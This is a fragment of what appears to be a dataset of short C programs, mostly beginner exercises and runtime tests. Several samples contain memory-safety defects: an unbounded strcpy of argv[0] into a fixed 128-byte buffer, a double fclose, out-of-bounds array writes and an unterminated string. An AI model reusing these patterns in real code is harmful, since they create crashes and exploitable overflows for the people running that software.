(999*999) + 1;\n    int match = 0;\n    while (!match) {\n        s = prev_palindrome(s);\n        match = has3digitfactor(s);\n    }\n    printf(\"%d\\n\", s);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int a, b;\n printf(\"Enter value of a:\");\n scanf(\"%d\",&a);\n printf(\"Enter value of b:\");\n scanf(\"%d\", &b);\n a=a^b;\n b=a^b;\n a=a^b;\n printf(\"After swapping:\\na=%d\", a);\n printf(\"\\nb=%d\", b);\n}",
    "#include <stdio.h>\nint main() {\n    int arr[] = {\n            1, 2, 3, 5, 6, 7\n    };\n    for (int i = 1; i <= 100; i++) {\n        printf(\"%d\\n\", i);\n    }\n}",
    "#include <stdio.h>\n#include <string.h>\n\n\nint getmaxnumlen(int num)\n{\n    int count = 1;\n    while(num >= 10)\n    {\n        num -= (num % 10);\n        num /= 10;\n        ++count;\n    }\n    return count;\n}\nint main(void)\n{\n    int network[50];\n    int maxnumlen = 0;\n    for(int i = 0; i < 50; ++i)\n        network[i] = i;\n    printf(\"Count: %d\\n\", (maxnumlen = getmaxnumlen(50)));\n    printf(\"Insert commands:\\n\");\n    int p,q;\n    char command[5+1];\n    while(1)\n    {\n        printf(\">>> \");\n        scanf(\"%s %d %d\", command, &p, &q);\n        if(!strcmp(command, \"query\"))\n        {\n            if(network[p] == network[q])\n                printf(\"The two nodes are connected.\\n\");\n            else\n                printf(\"The two nodes are not connected.\\n\");\n        }\n        else if(!strcmp(command, \"union\"))\n        {\n            int value = network[p];\n            for(int i = 0; i < 50; ++i)\n                if(network[i] == value)\n                    network[i] = network[q];\n        }\n        else\n            printf(\"Invalid command.\\n\");\n        for(int i = 0; i < 50; ++i)\n            printf(\"%d \", network[i]);\n        printf(\"\\n\");\n    }\n}",
    "#include <assert.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <stdint.h>\n\nint foo(uint8_t i){\n  int k = 0;\n  while(k < 3){\n    k++;\n  }\n  return i;\n}\nint main(int argc, char** argv) {\n  return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint main()\n{\n    int x, y;\n    float a, b;\n    scanf(\"%i %i\", &x, &y);\n    scanf(\"%f %f\", &a, &b);\n    printf(\"%i %i\\n%.1f %.1f\\n\", (x + y), (x - y), (a + b), (a - b));\n    return 0;\n}",
    "#include <stdio.h>\nint main( )\n{\n   int *i;\n   int j = 9;\n   i = &j;\n   printf( \"j = %i\\n\", j );\n   printf( \"i = %i\\n\", *i );\n   j = 8;\n   printf( \"j = %i\\n\", j );\n   printf( \"i = %i\\n\", *i );\n   *i = 7;\n   printf( \"j = %i\\n\", j );\n   printf( \"i = %i\\n\", *i );\n   return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <limits.h>\nint main() {\n  fprintf(stdout, \"%d\", CHAR_BIT);\n  exit(0);\n}",
    "#include <stdio.h>\nint main()\n{\n    int n, i;\n    int sum, a;\n    while (scanf(\"%d\", &n) != (-1))\n    {\n        sum = 0;\n        for (i = 0; i < n; i++)\n        {\n            scanf(\"%d\", &a);\n            sum += a;\n        }\n        printf(\"%d\\n\", sum);\n    }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n int find_missing(int orig[],int On,int shuffled[])\n{\n int i,sum=0;\n for(i=0;i<On-1;i++)\n  sum+=orig[i]-shuffled[i];\n return sum+orig[On-1];\n}\nint main()\n{\n int arr[]={1,3,5,6,2,5,6,8,9,23,45,67,87};\n int shuffled_arr[]={1,2,5,6,8,9,3,45,87,6,67,5};\n int On=sizeof(arr) / sizeof(arr[1]);\n printf(\"The missing value is:%d\\n\",find_missing(arr,On,shuffled_arr));\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[])\n{\n int nthNumber;\n int sum = 0;\n printf(\"Please enter the nth number\\n\");\n scanf(\"%d\", &nthNumber);\n int a = 1;\n int d = 1;\n int i = a;\n while (i <= nthNumber) {\n  sum = sum + i;\n  i = i + d;\n }\n printf(\"series sum is - %d\\n\", sum);\n return 0;\n}",
    "#include <stdio.h>\nvoid repeat(int count)\n{\n int x;\n for(x=0;x<count;x++)\n  printf(\"Blah \");\n putchar('\\n');\n}\nint main()\n{\n printf(\"Chris said: \");\n repeat(1);\n printf(\"Pat said: \");\n repeat(3);\n return(0);\n}",
    "#include <math.h>\n#include <stdio.h>\nint main(void) {\n    double pi = 3.1415926535;\n    double x, y;\n    long double lpi = 3.1415926535;\n    long double lx, ly;\n    x = tanh(pi / 4);\n    y = atanh(x);\n    lx = tanhl(pi / 4);\n    ly = atanhl(x);\n    printf(\"tanh( %f ) = %f\\n\", pi / 4, x);\n    printf(\"atanh( %f ) = %f\\n\", x, y);\n    printf(\"tanhl( %Lf ) = %Lf\\n\", lpi / 4, lx);\n    printf(\"atanhl( %Lf ) = %Lf\\n\", lx, ly);\n}",
    "#include <stdio.h>\n\nint main()\n{\n  float radius, height, volume, surfaceArea;\n  printf(\"Enter the radius: \\n\");\n  scanf(\"%f\", &radius);\n  printf(\"Enter the height: \\n\");\n  scanf(\"%f\", &height);\n  volume = 3.1416 * radius * radius * height;\n  surfaceArea = (2 * 3.1416 * radius * height) + (2 * 3.1416 * radius * radius);\n  printf(\"The volume is: %.2f \\n\", volume);\n  printf(\"The surface area is: %.2f \\n\", surfaceArea);\n  return 0;\n}",
    "#include<stdio.h>\nint main(){\n int i=0;\n char q,s[501];\n for(scanf(\"%s\",s);q=s[i];i++){\n  if(q<'A'||q>'Z')\n   printf(\"%c\",q);\n  else\n   printf(\"%c\",q-'A'+'a');\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char* argv[])\n{\n printf(\"There was %d arguments provided : \\n\", argc);\n for(int i = 0; i < argc; ++i)\n  printf(\"argument #%d\\t-\\t%s\\n\", i, argv[i]);\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int a, b, min = 0;\n    scanf(\"%d %d\", &a, &b);\n    a = a >= 0 ? a : - a;\n    b = b >= 0 ? b : -b;\n    min = a == 0 ? b : b == 0 ? a : a >= b ? a : b;\n    while((a%min!=0 || b%min!=0)&&(a!=0&&b!=0)){\n        min --;\n    }\n    printf(\"%d\", min);\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n puts(\"success\");\n return 0;\n}",
    "#include <stdio.h>\n\nint main (){\n    float R;\n    printf (\"Digite uma angulo em radianos: \");\n    scanf (\"%f\", &R);\n    printf (\"%.2f radianos eh igual a: %.2f graus.\\n\", R, R * 180 / 3.14);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    int n, number;\n    printf(\"Enter the number to be searched for: \");\n    scanf(\"%d\", &number);\n    printf(\"Enter the number of elements in the array: \");\n    scanf(\"%d\", &n);\n    int arr[n];\n    printf(\"Enter the elements of the array:\\n\");\n    for(int i = 0; i < n; i++) {\n      scanf(\"%d\", &arr[i]);\n    }\n    int L = 0, U = n - 1, M, flag = 0;\n    while(L < U) {\n      M = (L + U) / 2;\n      if(arr[M] < number) L = M + 1;\n      else if(arr[M] > number) U = M - 1;\n      else if(arr[M] == number) {\n        flag = 1;\n        break;\n      }\n    }\n    if(flag == 1) printf(\"The number is present at position %d\", (M + 1));\n    else printf(\"The number is not present.\");\n    return 0;\n}",
    "#include<stdio.h>\nvoid gcd( int u, int v )\n{\n    int temp;\n    printf( \"The gcd of %i and %i is \", u, v );\n    while( v != 0 )\n    {\n temp = u % v;\n u = v;\n v = temp;\n    }\n    printf( \"%i\\n\", u );\n}\nint main( void )\n{\n    gcd( 150, 35 );\n    gcd( 1026, 405 );\n    gcd( 83, 240 );\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint main(void) {\n    int *vetor = malloc(10 * sizeof(int));\n    for (int i = 0; i < 10 ; i++) {\n     vetor[i] = i + 1;\n     printf(\"%d\\n\", vetor[i]);\n    }\n    printf(\"\\n%d\", 10);\n}",
    "#include<stdio.h>\nint sum();\nint main(){\n        int a = 100;\n        int b = 200;\n        int result;\n        result = sum(a, b);\n        printf(\"Sum of %d and %d is %d\\n\", a, b, result);\n        return 0;\n}\nint sum(int num1, int num2) {\n     return num1 + num2;\n}",
    "#include <string.h>\nint main(int argc, char **argv) {\n char buf[128];\n strcpy(buf, argv[0]);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int n,i=0,next,prev=1,r;\n printf(\"\\nEnter The No. Of Terms - \");\n scanf(\"%d\",&n);\n for(r=1;r<=n;r++)\n {\n  if(r<=1)\n   next=r;\n  else\n  {\n  next=i+prev;\n  i=prev;\n  prev=next;\n     }\n  printf(\"%d\\t\",next);\n    }\n  return 0;\n}",
    "#include <stdio.h>\nvoid swap(int *, int *);\nint main(void)\n{\n    int x = 5;\n    int y = 10;\n    printf(\"originally: x=%d (%p) and y=%d (%p)\\n\", x, &x , y, &y);\n    swap(&x, &y);\n    printf(\"after swap: x=%d (%p) and y=%d (%p)\\n\", x, &x , y, &y);\n    return 0;\n}\nvoid swap(int *x, int *y)\n{\n    int temp;\n    temp = *x;\n    *x = *y;\n    *y = temp;\n    printf(\"in swap: x=%d (%p) and y=%d (%p)\\n\", *x, &x , *y, &y);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint main(int argc,char *argv[])\n{\n  int n,i = 0,j = 0,k = 0,l = 0,p = 0,m,o;\n  float h,c0,c1,h1;\n  n = atoi(argv[1]);\n  h = atof(argv[2]);\n  float a[n],b[n - 1],x[n];\n  while (l != n+1) {\n    printf(\"a_%d =\",l);\n    scanf(\"%f\",&a[l]);\n    l++;\n  }\n  for (o = 0;o < n;o++) {\n    x[o] = a[o];\n  }\n  b[0] = a[0];\n  while (p != 2) {\n    while (i <= n) {\n      b[i + 1] = x[i+1] + (b[i] * h);\n      printf(\"b[%d] = %f\\n\",i+1,b[i + 1]);\n      i++;\n    }\n    c0 = b[n];\n    printf(\"c0 = %f\\n\",c0);\n    while (j != n) {\n      a[j+1] = b[j+1];\n      j++;\n    }\n    while (k != n) {\n      b[k + 1] = a[k+1] + (b[k] * h);\n      printf(\"b[%d] = %f\\n\",k+1,b[k + 1]);\n      k++;\n    }\n    c1 = b[n - 1];\n    printf(\"c1 = %f\\n\",c1);\n    h1 = h - (c0/c1);\n    printf(\"h = %f\\n\",h1);\n    h = h1;\n    i = 0;\n    j = 0;\n    k = 0;\n    p++;\n  }\n    printf(\"Root = %f\\n\",h1);\n}",
    "#include<stdio.h>\nint gcd(int a,int b)\n{\n    if(b==0) {return a;}\n    return gcd(b,(a%b));\n}\nint common_divisors(int a[],int m,int n,int gcdmn)\n{\n    int i,j=1;\n    for(i=1;i<=gcdmn;i++)\n    {\n        if((m%i)==0 && (n%i)==0)\n        {\n            a[j]=i;\n            j++;\n        }\n    }\n    return (j-1);\n}\nint main()\n{\n    int t,i;\n    int m,n,z,gcdmn;\n    int a[1000];\n    scanf(\"%d\",&t);\n    for(i=0;i<t;i++){\n    scanf(\"%d %d\",&m,&n);\n    gcdmn = gcd(m,n);\n    z =common_divisors(a,m,n,gcdmn);\n    printf(\"%d\\n\",z);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nchar str1[2000010],str2[2000010];\nint main()\n{\n    int len1,len2,i,j,l,k;\n    while(scanf(\"%s %s\",str1,str2)==2)\n    {\n        len1 = strlen(str1);\n        len2 = strlen(str2);\n        l = 0,k=0;\n        for(i=0; i<len1; i++)\n        {\n            for(j=l; j<len2; j++)\n            {\n                if(str2[j]==str1[i])\n                {\n                    l = j + 1;\n                    k++;\n                    break;\n                }\n            }\n        }\n        str1[len1] = '\\0';\n        str2[len2] = '\\0';\n        if(len1==k)\n            printf(\"Yes\\n\");\n        else\n            printf(\"No\\n\");\n        memset(str1,'\\0',sizeof(str1));\n        memset(str2,'\\0',sizeof(str2));\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\n#include <ctype.h>\n#include <stdlib.h>\n\n_Bool is_vowel(char c) {\n return c == 'a' || c == 'A' || c == 'e' || c == 'E' || c == 'i' || c == 'I' || c == 'o' || c == 'O' || c == 'u' || c == 'U';\n}\nint copy_non_vowels(int num_chars, char* in_buf, char* out_buf) {\n int position = 0;\n for (int i = 0; i < num_chars; i++) {\n  if(!is_vowel(in_buf[i])){\n   out_buf[position]=in_buf[i];\n   position++;\n  }\n }\n return position;\n}\nvoid disemvowel(FILE* inputFile, FILE* outputFile) {\n int chars;\n int other_chars;\n char in_buffer[1024];\n chars = fread(in_buffer, sizeof(char), 1024, inputFile);\n char out_buffer[chars];\n other_chars = copy_non_vowels(chars, in_buffer, out_buffer);\n fwrite(out_buffer, sizeof(char), other_chars, outputFile);\n}\nint main (int argc, char *argv[]) {\n FILE *input;\n FILE *output;\n switch(argc) {\n  case 1:\n   input=(stdin);\n   output=(stdout);\n   break;\n  case 2:\n   if((input = fopen(argv[1], \"r\" )) == ((void*)0)) {\n    puts(\"input incorrect\");\n    exit(0);\n   } else {\n   }\n   break;\n  case 3:\n   if((input=fopen(argv[2], \"r\")) == ((void*)0)) {\n    puts(\"input incorrect\");\n    exit(0);\n   } else {\n   }\n   if ((output= fopen(argv[2], \"w\")) == ((void*)0)) {\n    puts(\"output incorrect\");\n    exit(0);\n   } else {\n   }\n   break;\n  default:\n   puts(\"too many args\");\n   exit(0);\n }\n disemvowel(input,output);\n fclose(input);\n fclose(output);\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n FILE *fp1;\n fp1 = fopen(\"test.txt\", \"a\");\n FILE **fp2;\n fp2 = &fp1;\n fclose(fp1);\n fclose(*fp2);\n}",
    "#include <stdio.h>\nint main() {\n    float a = 3.141592f;\n    double b = 3.141592;\n    printf(\"a : %f \\n\", a);\n    printf(\"b : %f \\n\", b);\n    return 0;\n}",
    "int main() {\n    int a, b, c;\n    a = 32;\n    b = a + 24;\n    c = b - a;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint gcd(int a, int b);\nvoid swap(int *a, int *b);\nint main() {\n    int n, i, j, coprime_count;\n    int *ary;\n    while( scanf(\"%d\", &n)!=(-1) ) {\n        if (n==0)\n            break;\n        ary = malloc(n * sizeof(int));\n        for (i=0; i<n; i++)\n            scanf(\"%d\", ary+i);\n        coprime_count = 0;\n        for (i=0; i<n-1; i++)\n            for (j=i+1; j<n; j++)\n                if (gcd(ary[i], ary[j])==1)\n                    coprime_count++;\n        if (coprime_count == 0)\n            printf(\"No estimate for this data set.\\n\");\n        else\n            printf(\"%f\\n\", sqrt( 6*(n*(n-1)/2) / (float)coprime_count) );\n        free(ary);\n    }\n    return 0;\n}\nint gcd(int a, int b){\n    if (b>a)\n        swap(&a, &b);\n    if (a%b != 0)\n        return gcd(b, a%b);\n    return b;\n}\nvoid swap(int *a, int *b){\n    int t=*a;\n    *a = *b;\n    *b = t;\n}",
    "#include <stdio.h>\nint main() {\n  int mark1, mark2;\n  float total;\n  printf( \"Enter marks 1: \" );\n  scanf( \"%d\", &mark1 );\n  printf( \"Enter marks 2: \" );\n  scanf( \"%d\", &mark2 );\n  total = mark1 + mark2;\n  printf( \"Average = %.2f\" ,total/2 );\n  return 0;\n}",
    "#include <stdio.h>\nvoid inspect(const void* location, size_t size) {\n    const unsigned char* byte = (const unsigned char*)location;\n    unsigned int i;\n    for (i = 0; i < size; i++) {\n        printf(\"byte %d: %02X\\n\", i, *byte++);\n    }\n    printf(\"\\n\");\n}\nint main() {\n    char letter = 'a';\n    int num = 2;\n    float floatNum = 4.52;\n    int arr[] = {1, 2, 3, 4};\n    char charray[5] = {'a', 'b', 'c', 'd', '\\0'};\n    printf(\"char: %c\\n\", letter);\n    inspect(&letter, sizeof(char));\n    printf(\"\\nint: %d\\n\", num);\n    inspect(&num, sizeof(int));\n    printf(\"\\nfloat: %.2f\\n\", floatNum);\n    inspect(&floatNum, sizeof(float));\n    printf(\"\\nint array: [1, 2, 3, 4]\\n\");\n    inspect(arr, sizeof(arr));\n    printf(\"\\nchar array: %s\\n\", charray);\n    inspect(charray, sizeof(charray));\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n int i;\n for (i = 1; i <= 20; i++)\n  printf(\"%d\\n\", i * i);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\nint main() {\n  FILE *f;\n  char buffer[1024 + 1];\n  sprintf(buffer, \"Hello World!!!!\");\n  f = popen(\"cat\", \"w\");\n  if (f != ((void*)0)) {\n    fwrite(buffer, sizeof(char), strlen(buffer), f);\n    pclose(f);\n    return 0;\n  }\n  return 1;\n}",
    "#include <stdio.h>\n\n\nvoid print_buffer(char buffer[], int length);\nint main()\n{\n    int column, non_blanks, c;\n    char buffer[80];\n    column = 1;\n    non_blanks = 0;\n    while ((c = getchar()) != (-1))\n        if (c == ' ' || c == '\\t') {\n            if (column + non_blanks <= 80)\n                column = column + non_blanks;\n            else {\n                putchar('\\n');\n                column = non_blanks + 1;\n            }\n            print_buffer(buffer, non_blanks);\n            non_blanks = 0;\n            putchar(c);\n            if (c == '\\t')\n                column = column + 8 - (column - 1) % 8;\n            else\n                column++;\n            if (column > 80) {\n                putchar('\\n');\n                column = 1;\n            }\n        } else if (c == '\\n') {\n            if (column + non_blanks > 80)\n                putchar('\\n');\n            print_buffer(buffer, non_blanks);\n            putchar('\\n');\n            column = 1;\n            non_blanks = 0;\n        } else if (non_blanks < 80)\n            buffer[non_blanks++] = c;\n        else {\n            if (column != 1)\n                putchar('\\n');\n            print_buffer(buffer, 80);\n            putchar(c);\n            while ((c = getchar()) != (-1) && c != ' ' && c != '\\t' && c != '\\n')\n                putchar(c);\n            putchar('\\n');\n            column = 1;\n            non_blanks = 0;\n        }\n    return 0;\n}\nvoid print_buffer(char buffer[], int length)\n{\n    int i;\n    for (i = 0; i < length; i++)\n        putchar(buffer[i]);\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <time.h>\nint main(void)\n{\n\n\n\n    return 0;\n}",
    "#include <stdio.h>\nint golomb_sequence(int n)\n{\n    int dp[n + 1];\n    dp[1] = 1;\n    for (int i = 2; i <= n; i++)\n    {\n        int prev = dp[i - 1];\n        int back_index = i - dp[prev];\n        dp[i] = 1 + dp[back_index];\n    }\n    return dp[n];\n}\nint main()\n{\n    int n;\n    printf(\"Enter the value of n?, where you need the n'th number in the golomb sequence.\");\n    scanf(\"%d\", &n);\n    if (n <= 0)\n    {\n        printf(\"The given value of n is invalid.\");\n        return 0;\n    }\n    int res = golomb_sequence(n);\n    printf(\"The %d \\'th term in the golomb sequence is %d\", n, res);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int num;\n    scanf(\"%d\", &num);\n    int end = num + 10;\n    while (num <= end)\n        printf(\"%d \", num++);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint product(int n) {\n    if (n==0) return 1;\n    if (n%10 == 0) return 0;\n    return n%10 * product(n/10);\n}\nint main()\n{\n    int n;\n    scanf(\"%d\",&n);\n    printf(\"%d\\n\",product(n));\n}",
    "#include <stdio.h>\nint main(int argc, const char *argv[]) {\n    int c;\n    while ((c = getchar()) != (-1)) {\n        putchar(c);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n    double d;\n    d = 135.2468;\n    printf(\"The value of 'd' is : '%e' \", d);\n    return 0;\n}",
    "#include<stdio.h>\nvoid selectionSort(int arr[], int size);\nvoid swap(int *firstVal, int *secondVal);\nint main(){\n  int arr[] = {4, 1, 7, 99, 45, 12, 9};\n  int size = sizeof(arr)/sizeof(arr[0]);\n  selectionSort(arr, size);\n  int i;\n  for(i=0; i<size; i++){\n    printf(\"%d\\n\", arr[i]);\n  }\n}\nvoid selectionSort(int arr[], int size){\n  int i, j, minIndex;\n  for(i=0; i<size-1; i++){\n    minIndex = i;\n    for(j=i+1; j<size; j++){\n      if(arr[j] < arr[minIndex]){\n        minIndex = j;\n      }\n    }\n    swap(&arr[i], &arr[minIndex]);\n  }\n}\nvoid swap( int *firstVal, int *secondVal){\n  int temp = *firstVal;\n  *firstVal = *secondVal;\n  *secondVal = temp;\n}",
    "#include <stdio.h>\n\nint is_valid(int i, int j, int sol[8 +1][8 +1]) {\n  if (i>=1 && i<=8 && j>=1 && j<=8 && sol[i][j]==-1)\n    return 1;\n  return 0;\n}\nint knight_tour(int sol[8 +1][8 +1], int i, int j, int step_count, int x_move[], int y_move[]) {\n  if (step_count == 8*8)\n    return 1;\n  int k;\n  for(k=0; k<8; k++) {\n    int next_i = i+x_move[k];\n    int next_j = j+y_move[k];\n    if(is_valid(i+x_move[k], j+y_move[k], sol)) {\n      sol[next_i][next_j] = step_count;\n      if (knight_tour(sol, next_i, next_j, step_count+1, x_move, y_move))\n        return 1;\n      sol[i+x_move[k]][j+y_move[k]] = -1;\n    }\n  }\n  return 0;\n}\nint start_knight_tour() {\n  int sol[8 +1][8 +1];\n  int i, j;\n  for(i=1; i<=8; i++) {\n    for(j=1; j<=8; j++) {\n      sol[i][j] = -1;\n    }\n  }\n  int x_move[] = {2, 1, -1, -2, -2, -1, 1, 2};\n  int y_move[] = {1, 2, 2, 1, -1, -2, -2, -1};\n  sol[1][1] = 0;\n  if (knight_tour(sol, 1, 1, 1, x_move, y_move)) {\n    for(i=1; i<=8; i++) {\n      for(j=1; j<=8; j++) {\n        printf(\"%d\\t\",sol[i][j]);\n      }\n      printf(\"\\n\");\n    }\n    return 1;\n  }\n  return 0;\n}\nint main() {\n  printf(\"%d\\n\",start_knight_tour());\n  return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint a(int n){\n int i,f=0;\n if(n==2) return 1;\n for (i=2;i<n;i++){\n  f+=(n%i==0);\n }\n if(f==0) return 1;\n else return 0;\n}\nint main(){\n int n;\n scanf(\"%d\",&n);\n n++;\n while(a(n)!=1){\n  n++;\n }\n printf(\"%d\",n);\n    system(\"PAUSE\");\n    return 0;}",
    "__attribute__ ((noinline))\nint foo(int a)\n{\n  return a * a;\n}\n__attribute__ ((noinline))\nint bar(int b)\n{\n  return b;\n}\n__attribute__ ((noinline))\nvoid caller(int x)\n{\n  return;\n}\nint main(int argc, char **argv)\n{\n  caller(foo(argc));\n  caller(bar(argc));\n  return 123;\n}",
    "#include <stdio.h>\nvoid reverse(char s[], int end) {\n char tmp;\n int i = 0;\n end--;\n while (i < (end-1)/2) {\n  tmp = s[i];\n  s[i++] = s[end-1];\n  s[(end--)-1] = tmp;\n }\n}\nint main () {\n char teste[] = \"daniel\";\n printf(\"%s\\n\", teste);\n reverse(teste, sizeof(teste));\n printf(\"%s\\n\", teste);\n return 0;\n}",
    "#include <stdio.h>\nint main ( void )\n {\n  int lcm ( int u, int v ) ;\n  int a, b ;\n  printf ( \"Enter the two numbers to calculate the LCM\\nA = \") ;\n  scanf ( \"%i\", &a ) ;\n  printf ( \"B = \" ) ;\n  scanf ( \"%i\", &b ) ;\n  if ( lcm ( a, b ) != 0 )\n   printf ( \"LCM = %i\", lcm ( a, b ) ) ;\n  else\n   printf ( \"Inavlid numbers\\n\" ) ;\n  return 0;\n }\nint lcm ( int u, int v )\n {\n  int gcd ( int u, int v ) ;\n  if ( u >= 0 && v >= 0 )\n   {\n    int x = u * v / gcd ( u, v ) ;\n    return x ;\n   }\n  else\n   return 0 ;\n }\nint gcd ( int u, int v )\n {\n  int temp;\n  while(v != 0)\n   {\n    temp = u % v;\n    u = v;\n    v = temp;\n   }\n  return u;\n }",
    "int main() {\n\n\n\n  return 0;\n\n}",
    "#include<stdio.h>\nint rec_lin(int arr[], int low, int high, int key);\nint main()\n{\n    int n, key, result = 0;\n    printf(\"Enter the size of the array\\n\");\n    scanf(\"%d\",&n);\n    int array[n];\n    printf(\"Enter the elements of the array\\n\");\n    for(int i=0;i<n;i++)\n    {\n        scanf(\"%d\",&array[i]);\n    }\n    printf(\"Enter the element to be searched\\n\");\n    scanf(\"%d\",&key);\n    result = rec_lin(array, 0, n-1, key);\n    (result == -1) ? printf(\"Element %d not found in the array\\n\", key)\n                   : printf(\"Element %d found in the index %d\",key, result);\n    return 0;\n}\nint rec_lin(int arr[], int low, int high, int key)\n{\n    if(high < low)\n        return -1;\n    else if(arr[low] == key)\n        return low;\n    else if(arr[high] == key)\n        return high;\n    else\n        rec_lin(arr, low+1, high -1, key);\n}",
    "#include <stdio.h>\n#include <math.h>\n#include <stdlib.h>\nint main(){\ndouble horas, min, segundos;\nprintf(\"digite o tempo atual detalhadamente em Horas, minutos e segundos\\n\");\nprintf(\"Horas\");\nscanf(\"%lf\", &horas);\nprintf(\"Minutos\");\nscanf(\"%lf\", &min);\nprintf(\"Segundos\");\nscanf(\"%lf\", &segundos);\ndouble tempoEmSegundos = (((horas * 60) + min) * 60) + segundos;\nprintf(\"O intervalo de tempo inserido \u00e9 equivalente a %.2f Segundos\\n \", tempoEmSegundos);\n}",
    "#include <stdio.h>\n#include <string.h>\nvoid parse(char *out, char *in, int n)\n{\n    char *pdot, *p;\n    for (pdot = in; *pdot != 0 && *pdot != '.'; ++pdot);\n    for (p = in; *p == '0' || *p == '.'; ++p);\n    int cnt = 0, exponent = pdot - p + (pdot < p);\n    if (*p == 0) exponent = 0;\n    out += sprintf(out, \"0.\");\n    for (; *p && cnt < n; ++p) {\n        if (*p != '.') {\n            *out++ = *p;\n            ++cnt;\n        }\n    }\n    for (; cnt < n; ++cnt) *out++ = '0';\n    sprintf(out, \"*10^%d\", exponent);\n}\nint main()\n{\n    int N;\n    char inA[128], inB[128], outA[128], outB[128];\n    scanf(\"%d %s %s\", &N, inA, inB);\n    parse(outA, inA, N);\n    parse(outB, inB, N);\n    if (!strcmp(outA, outB))\n        printf(\"YES %s\\n\", outA);\n    else\n        printf(\"NO %s %s\\n\", outA, outB);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <errno.h>\n\nvoid error(char *message);\nint main(int argc, char **argv){\n    char buffer[1000000];\n    char *curr;\n    int left;\n    int written;\n    int flags;\n    if ((left = read(0, buffer, 1000000)) < 0)\n        error(\"read()\");\n    if ((flags = fcntl(1, (3), 0)) < 0)\n        error(\"fcntl()\");\n    flags |= ((__wasi_fdflags_t)(1 << 2));\n    if ((flags = fcntl(1, (4), flags)) < 0)\n        error(\"fcntl()\");\n    for(curr = buffer; left > 0;){\n        errno = 0;\n        written = write(1, curr, left);\n        fprintf((stderr), \"written %d bytes, errno = %d\\n\", written, errno);\n        if (written > 0){\n            curr += written;\n            left -= written;\n        }\n    }\n    flags &= ~((__wasi_fdflags_t)(1 << 2));\n    if ((flags = fcntl(1, (4), flags)) < 0)\n        error(\"fcntl()\");\n    exit(0);\n}\nvoid error(char *message){\n    perror(message);\n    exit(1);\n}",
    "#include <stdio.h>\nint main(void) {\n    int number, i;\n    printf(\"Emnter a integer: \");\n    scanf(\"%d\", &number);\n    printf(\"The factor of %d are: \\n\", number);\n    for (i=1; i<=number; ++i) {\n        if (number%i==0) {\n            printf(\"%d \", i);\n        }\n    }\n    printf(\"\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n printf(\"Hello World2!\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <ctype.h>\n\nint main()\n{\n    int c, columns = 0;\n    printf(\"\\n\");\n    while ((c = getchar()) != (-1))\n    {\n        if ((0 ? isprint(c) : ((unsigned)(c)-0x20) < 0x5f))\n        {\n            printf(\"%c\", c);\n            columns++;\n        } else\n        {\n            printf(\"[0x%02X]\", c);\n            columns += 6;\n        }\n        if (c == '\\n' || columns >= 80)\n        {\n            printf(\"\\n\");\n            columns = 0;\n        }\n        if (c == '\\t')\n        {\n            printf(\"\\t\");\n        }\n    }\n    printf(\"\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main (void) {\n    int array[4];\n    array[0] = 42;\n    array[1] = 59;\n    char string[5] = \"word\";\n    printf(\"%s\\n\", string);\n    char broken_string[4] = \"word\";\n    printf(\"%s\\n\", broken_string);\n    return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\n int a[110]={};\n    int b[110];\n    int n,k,i;\n    int l,r,h;\n    int min,max;\nint N(int l,int r)\n{\n    int i=l;\n    int sum=0;\n    while(i<=r)\n    {\n        sum=sum+a[i];\n        i++;\n    }\n    sum=sum%n;\n    return sum;\n}\nint M(int l,int r)\n{\n    int sum=1;\n    int i=l;\n    while(i<=r)\n    {\n        sum=sum*a[i];\n        i++;\n        sum=sum%n;\n    }\n    sum=sum%n;\n    return sum;\n}\nint H(int l,int r)\n{\n    int sum;\n    int i=l+1;\n    sum=a[l];\n    while(i<=r)\n    {\n        sum=sum^a[i];\n        i++;\n    }\n    return sum;\n}\nint main()\n{\n    scanf(\"%d%d\",&n,&k);\n    for(i=0;i<n;i++) scanf(\"%d\",&a[i]);\n    for(i=1;i<=k;i++)\n    {\n        scanf(\"%d%d\",&l,&r);\n        min=N(l,r)<M(l,r)?N(l,r):M(l,r);\n        max=N(l,r)>M(l,r)?N(l,r):M(l,r);\n        h=H(min,max);\n        b[i]=h;\n    }\n    for(i=1;i<=k;i++)\n        printf(\"%d\\n\",b[i]);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n double pi,A,B,C;\n scanf(\"%lf\",&A);\n scanf(\"%lf\",&B);\n scanf(\"%lf\",&C);\n pi=3.14159;\n printf(\"TRIANGULO: %0.3lf\\n\",(A*C)/2);\n printf(\"CIRCULO: %0.3lf\\n\",(C*C)*pi);\n printf(\"TRAPEZIO: %0.3lf\\n\",((A+B)*C)/2);\n printf(\"QUADRADO: %0.3lf\\n\",B*B);\n printf(\"RETANGULO: %0.3lf\\n\",A*B);\n return 0;\n}",
